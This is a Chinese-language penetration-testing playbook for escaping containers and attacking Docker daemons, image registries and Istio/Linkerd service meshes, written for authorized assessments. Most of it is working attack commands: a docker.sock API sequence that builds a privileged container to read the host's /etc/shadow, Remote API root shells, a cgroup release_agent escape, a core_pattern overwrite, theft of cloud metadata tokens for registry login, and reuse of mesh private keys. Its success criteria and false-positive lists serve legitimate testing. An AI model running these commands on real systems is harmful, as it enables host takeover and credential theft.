# 容器运行时与镜像：Docker、Registry、服务网格

> 适用：目标是 Docker/containerd 宿主机、暴露的 Registry 或 Istio/Linkerd 网格的授权评估，覆盖 daemon 与 Remote API、镜像层取证、特权容器以及 Compose/K8s 边界。

## 认什么

先分清视角，证据标准不同：容器内执行权 / 宿主机上的 docker 组用户 / 外部可达的 Registry 与 Remote API。

### 1. 容器身份

- `cat /proc/1/cgroup | grep -qi docker`、`ls /.dockerenv`、`cat /proc/1/sched | head -1`（PID 1 不是 systemd/init）。
- `uname -r` 是宿主机内核，直接决定内核 CVE 面。

### 2. 逃逸条件清单（按成功率排序）

| 条件 | 判据 | 路径 |
|---|---|---|
| 特权容器 | `grep CapEff /proc/1/status` 全能力 `0000003fffffffff` | 挂磁盘 / cgroup `release_agent` / `nsenter` |
| docker.sock | `ls -la /var/run/docker.sock` | 建挂载 `/` 的特权容器 |
| Remote API 2375 | 探测网关 `2375` | 远程建特权容器 |
| 宿主机目录挂载 | `mount \| grep -v 'overlay\|proc\|sys'` | 写 crontab / SSH key / 读 shadow |
| docker 组 | `id \| grep docker` | 宿主机上 `docker run -v /:/host` |
| CAP_SYS_ADMIN | `grep Cap /proc/1/status` | mount、cgroup 逃逸 |
| CAP_SYS_PTRACE + hostPID | `ls /proc/*/exe` 有宿主进程 | 注入宿主机进程 |
| CAP_DAC_READ_SEARCH | 同上 | 任意文件读（shocker 类手法） |
| hostNetwork | `ip addr` 见节点网卡 | 节点服务 / IMDS |
| 运行时 CVE | runc < 1.0-rc6 `CVE-2019-5736`；containerd < 1.3.9 `CVE-2020-15257` | 覆盖 runc / shim socket |
| 内核 CVE | `uname -r` | DirtyPipe `CVE-2022-0847`（5.8–5.16.11）、DirtyCow `CVE-2016-5195`、Netfilter `CVE-2021-22555` |

### 3. Registry 与镜像层

- 指纹：响应头 `Docker-Distribution-Api-Version`，`GET /v2/` 返回 `{}` 或 401。
- 镜像层保留历史文件变化：最终层删掉的凭据，早期 layer 仍在。高价值位置：`.env`、`config.*`、`kubeconfig`/`.kube/config`、`.docker/config.json`、`id_rsa`、`.npmrc`/`.pypirc`、Dockerfile history 里的 ARG/ENV。

### 4. 服务网格

- Envoy Admin 监听 `localhost:15000`（Istio），`/clusters`、`/config_dump`、`/certs` 免认证；Istiod debug 在 `15014`（`/debug/endpointz`、`/debug/configz`）；Linkerd proxy admin 在 `4191`。
- 证书位置：`/etc/certs/`（旧版 Istio）、`/var/run/secrets/istio/`（SDS）：`cert-chain.pem`、`key.pem`、`root-cert.pem`，SAN 是 `spiffe://cluster.local/ns/<ns>/sa/<sa>`。
- Gateway 的 TLS 来自 Secret：`kubectl get gateway -A -o yaml | grep -A3 credentialName` → `tls.crt`/`tls.key`。

### 5. Compose / K8s 边界

- `find / -name "docker-compose*"`：配置里的密码、挂载点、网络段一次暴露。
- K8s Pod 挂载 docker.sock = 节点级能力；containerd 节点对应 `/run/containerd/containerd.sock`。
- 构建上下文穿越：CI/托管构建允许指定 context（如 `dockerBuildPath: ".."`）时，`COPY . /data` 会把构建用户 `$HOME`（`.docker/config.json`、`.kube/config`、`.aws/credentials`、`.ssh/id_rsa`）整包读出。

## 打哪（命令）

Docker API（无 CLI 也能完成全流程）：

```bash
SOCK=/var/run/docker.sock
curl -s --unix-socket $SOCK http://localhost/images/json
curl -s --unix-socket $SOCK -X POST -H 'Content-Type: application/json' \
  http://localhost/containers/create \
  -d "{\"Image\":\"$IMAGE\",\"Cmd\":[\"cat\",\"/mnt/etc/shadow\"],\"HostConfig\":{\"Binds\":[\"/:/mnt\"],\"Privileged\":true}}"
curl -s --unix-socket $SOCK -X POST http://localhost/containers/$CID/start
curl -s --unix-socket $SOCK "http://localhost/containers/$CID/logs?stdout=true&stderr=true"
```

Remote API 与 docker 组：

```bash
GW=$(hostname -I 2>/dev/null | awk '{print $1}' | awk -F. '{print $1"."$2"."$3".1"}')
[ -z "$GW" ] && GW=$(ip route 2>/dev/null | awk '/default/{print $3}')
timeout 3 bash -c "echo >/dev/tcp/$GW/2375" 2>/dev/null && echo "API on $GW:2375"
docker -H tcp://$GW:2375 run -v /:/mnt -it alpine chroot /mnt bash
id | grep docker && docker run -v /:/host -it alpine chroot /host sh
```

cgroup / procfs（需 CAP_SYS_ADMIN 或宿主机 procfs 已挂载）：

```bash
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1)); mkdir -p $d/w; echo 1 > $d/w/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > $d/release_agent; echo '#!/bin/sh' > /cmd; echo "id > $host_path/out" >> /cmd
chmod a+x /cmd; sh -c "echo \$\$ > $d/w/cgroup.procs"; cat /out
# core_pattern：找到容器在宿主机的 merged 路径后写入
upperdir=$(sed -n 's/.*\bupperdir=\([^,]*\).*/\1/p' /proc/mounts)
host_path=$(dirname "$upperdir")/merged
echo -e "|${host_path}/tmp/.t.py \rcore " > /host/proc/sys/kernel/core_pattern
```

Registry 枚举与镜像取证：

```bash
curl -i https://REGISTRY/v2/
curl -sk https://REGISTRY/v2/_catalog
curl -sk --user 'U:P' https://REGISTRY/v2/IMAGE/tags/list
curl -sk --user 'U:P' -H 'Accept: application/vnd.docker.distribution.manifest.v2+json' \
  https://REGISTRY/v2/IMAGE/manifests/latest
curl -sk --user 'U:P' https://REGISTRY/v2/IMAGE/blobs/sha256:DIGEST -o layer.tar.gz
docker save IMAGE:TAG -o image.tar && tar -xf image.tar -C /tmp/image && dive IMAGE:TAG
# 云工作负载身份直接换 Registry 登录
curl -s -H 'Metadata-Flavor: Google' \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
docker login -u oauth2accesstoken -p ACCESS_TOKEN https://gcr.io
```

服务网格取证（读优先）：

```bash
curl -s localhost:15000/clusters | grep -oP '[\w.-]+\.[\w.-]+\.svc\.cluster\.local' | sort -u
curl -s localhost:15000/config_dump > /tmp/envoy.json
curl -s localhost:15000/certs
kubectl get virtualservices,destinationrules,gateways,peerauthentication,authorizationpolicies -A -o yaml
kubectl get secret CERT -n istio-system -o jsonpath='{.data.tls\.crt}' | base64 -d > mesh.pem
openssl x509 -in /var/run/secrets/istio/cert-chain.pem -text -noout | grep -A1 'Subject Alternative Name'
curl --cert /var/run/secrets/istio/cert-chain.pem --key /var/run/secrets/istio/key.pem \
     --cacert /var/run/secrets/istio/root-cert.pem https://target-svc:PORT/
curl -s http://localhost:4191/metrics   # Linkerd proxy admin
```

写操作（授权内、改前存原配置、可回滚）：VirtualService 的 `mirror` + `mirrorPercentage: 100.0` 做镜像观察；Harbor 后门镜像/复制策略见 `./cloud-10-CICD与供应链与IaC.md`。

## 什么算成

- docker.sock / 2375：`containers/create` + `start` 成功，`logs` 返回宿主机文件内容（一次给全四步响应）。
- 特权容器：容器内读到宿主机 `/etc/shadow`、`/root/.ssh/`、或写入 `/etc/cron.d` 后在宿主机侧执行产生输出。
- Registry：`/v2/_catalog` 200 且能下 manifest + blob；镜像解包后取到 kubeconfig、Registry 凭据、私钥或 DB 口令（贴路径与关键行，不整包外带）。
- 服务网格：`config_dump` 得到完整后端服务清单且抽一条可复现访问；证书 SAN 为 `spiffe://...`；镜像策略生效时我们控制的地址收到真实业务请求。
- 云身份换 Registry：元数据 Token 能 `docker login` 成功并拉取私有镜像。
- 构建上下文：`COPY` 出的 `$HOME` 文件里含真实凭据（不是模板/空文件）。

## 假点

- `/v2/` 返回 401 + `WWW-Authenticate`：这是正常认证，不是未授权。
- `/v2/_catalog` 200 但数组为空：没有可读仓库。
- docker.sock 存在但 `permission denied`：当前用户不在 docker 组或 sock 只读挂载。
- 2375 可连但 `/containers/create` 403：已启用 TLS/鉴权，只能算端口暴露。
- `core_pattern` 写的是容器自身 namespaced 路径（`/proc/sys/kernel/core_pattern`）：对宿主机无效。
- Envoy 15000 只在本 Pod 可达，跨 Pod 访问不到；Linkerd 4191 同理。
- `PeerAuthentication: PERMISSIVE` 下明文能通 ≠ 绕过 AuthorizationPolicy（策略仍在 Envoy 层判定）。
- 镜像里只有基础层、grep 到的 `password` 是占位符或示例值：不算凭据泄露。

## 与其他包联动

- 逃逸后的集群扩散、Ingress/Istio 策略绕过：`./cloud-06-K8s攻击面-逃逸与集群.md`。
- 集群内服务发现与 sidecar 抓包：`./cloud-07-K8s攻击面-组件-网络-存储.md`。
- Registry 凭据能读到的对象存储：`./cloud-09-对象存储与Serverless.md`。
- Harbor/ArgoCD/CI 构建上下文：`./cloud-10-CICD与供应链与IaC.md`。
- 构建上下文路径穿越的通用形态：`../../web-file-path/knowledge/path-traversal-lfi-test.md`。
- 写操作边界：`../../../../rules/20-min-harm.md`；报告与定级：`../../../../rules/40-evidence-report.md`。
